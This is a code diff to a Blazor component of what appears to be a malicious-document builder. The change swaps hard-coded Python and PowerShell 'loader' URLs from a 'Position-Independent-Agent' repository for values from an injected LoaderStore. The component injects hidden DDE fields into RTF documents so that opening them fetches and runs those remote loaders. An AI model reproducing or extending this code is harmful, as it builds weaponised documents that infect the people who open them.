@@ -1,4 +1,5 @@
 @inject IJSRuntime JS
+@inject LoaderStore Loaders
 
 <div class="tool-panel">
     <div class="tool-header">
@@ -132,23 +133,24 @@
 </div>
 
 @code {
-    private const string DefaultPythonLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/python/loader.py";
-    private const string DefaultPowerShellLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/windows/powershell/loader.ps1";
-
     private enum Mode { Generate, Upload }
     private enum LoaderType { Python, PowerShell }
 
     private Mode _mode = Mode.Generate;
     private LoaderType _loaderType = LoaderType.Python;
     private bool _hidden = true;
-    private string _loaderUrl = DefaultPythonLoaderUrl;
+    private string _loaderUrl = "";
     private string _docTitle = "";
     private string _docBody = "";
     private string _rtfContent = "";
     private string _customFileName = "";
     private string _customRtfContent = "";
 
-    protected override void OnInitialized() => Rebuild();
+    protected override void OnInitialized()
+    {
+        _loaderUrl = Loaders.PythonLoaderUrl;
+        Rebuild();
+    }
 
     private void SetMode(Mode mode)
     {
@@ -158,7 +160,7 @@
     private void SetLoaderType(LoaderType type)
     {
         _loaderType = type;
-        _loaderUrl = type == LoaderType.Python ? DefaultPythonLoaderUrl : DefaultPowerShellLoaderUrl;
+        _loaderUrl = type == LoaderType.Python ? Loaders.PythonLoaderUrl : Loaders.PowerShellLoaderUrl;
         Rebuild();
         if (!string.IsNullOrEmpty(_customRtfOriginal))
             _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
